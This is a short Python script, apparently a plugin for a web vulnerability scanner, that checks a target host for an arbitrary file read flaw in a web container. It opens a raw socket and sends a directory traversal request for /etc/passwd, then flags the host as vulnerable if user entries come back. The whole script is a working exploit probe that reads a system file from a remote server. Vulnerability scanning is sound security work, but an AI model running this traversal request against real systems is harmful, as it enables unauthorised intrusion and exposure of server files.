# -*- coding:utf-8 -*-

import socket

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    timeout = 10
    print('testing if web container arbitrary file read vul')
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = b"GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if b'root:' in data and b'nobody:' in data:
            msg = 'There is web container arbitrary file read vul on url: ' +url+ ' .'
            number = 'v30'
            print(msg)
            return True,url,number,msg
        else:
            msg = 'There is no web container arbitrary file read vul'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg

